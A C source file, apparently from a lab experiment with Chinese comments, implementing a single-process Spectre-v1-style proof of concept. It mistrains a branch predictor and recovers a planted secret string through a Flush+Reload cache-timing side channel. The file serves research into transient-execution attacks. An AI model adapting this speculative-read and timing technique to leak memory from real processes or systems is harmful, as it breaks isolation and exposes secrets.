/********************************************
 * master-v2.c: 验证是否可以直接使用单个进程
 *
 * 此版本的代码与master-v1相比，主要区别在于：不再使用fork创建子进程，而是直接在单个进程中进行缓存攻击
 *
 * 实验结果: 在单个进程中，双平台攻击仍然有效（甚至能够更快恢复密码）。
 * 
 * 
*********************************************/


#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>
#include <unistd.h>
#include "../utils/cache_timing.h"


#define DATA "data|"
#define SECRET "INACCESSIBLE SECRET"
#define TEXT DATA SECRET
#define PAGE_SIZE 4096

static size_t CACHE_MISS = 0;
unsigned char array1[128];
char *mem = NULL;



void cache_encode(char index)
{
    maccess(mem + index * PAGE_SIZE);
}

char victim(int x)
{
    size_t len = sizeof(DATA) - 1;
    mfence();
    flush(&len);
    flush(&x);
    mfence();

    if ((float)x / (float)len < 1)
    {
        cache_encode(array1[x]);
    }
}

void train_branch_predictor()
{
    for (int y = 0; y < 10; y++)
    {
        victim(0);
    }
}


int flush_reload(void *ptr) {
  uint64_t start = 0, end = 0;
  start = rdtscp();
  maccess(ptr);
  end = rdtscp();
  mfence();
  flush(ptr);
  if (end - start < CACHE_MISS) {
    return 1;
  }
  return 0;
}




void cache_detect(char *leaked, int index)
{
    int mix_i;
    for (int i = 0; i < 256; i++)
    {
        // 伪随机顺序访问，防止被预测
        mix_i = ((i * 167) + 13) & 255;
        if (flush_reload(mem + mix_i * PAGE_SIZE))
        {
            if ((mix_i >= 'A' && mix_i <= 'Z') && leaked[index] == ' ')
            {
                leaked[index] = mix_i;
                printf("\x1b[33m%s\x1b[0m\r", leaked);
            }
        }
        fflush(stdout);
    }
}

void flush_cache()
{
    for (int i = 0; i < 256; i++)
    {
        flush(mem + i * PAGE_SIZE);
    }
}



int main(int argc, const char **argv)
{
    if (argc > 1) {
        // 如果用户提供了参数，则使用该参数作为 CACHE_MISS
        CACHE_MISS = (size_t)strtoul(argv[1], NULL, 0);
    }

    if (!CACHE_MISS) {
        CACHE_MISS = detect_flush_reload_threshold();
    }
    printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

    char *_mem = malloc(PAGE_SIZE * (256 + 4));
    mem = (char *)(((size_t)_mem & ~(PAGE_SIZE - 1)) + PAGE_SIZE * 2);

    memset(mem, 0, PAGE_SIZE * 256);

    memset(array1, ' ', sizeof(array1));
    memcpy(array1, TEXT, sizeof(TEXT));

    array1[sizeof(array1) / sizeof(array1[0]) - 1] = '0';

    flush_cache();

    char leaked[sizeof(TEXT) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(TEXT)] = 0;

    int j = 0;
    while (1)
    {
        j = (j + 1) % sizeof(TEXT);


        train_branch_predictor();


        victim(j);
        if (j >= sizeof(DATA) - 1)
        {
            mfence();
            cache_detect(leaked, j);
        }
        if (!strncmp(leaked + sizeof(DATA) - 1, SECRET, sizeof(SECRET) - 1))
            break;

    }
    free(_mem);
    printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done\n");
    return 0;
}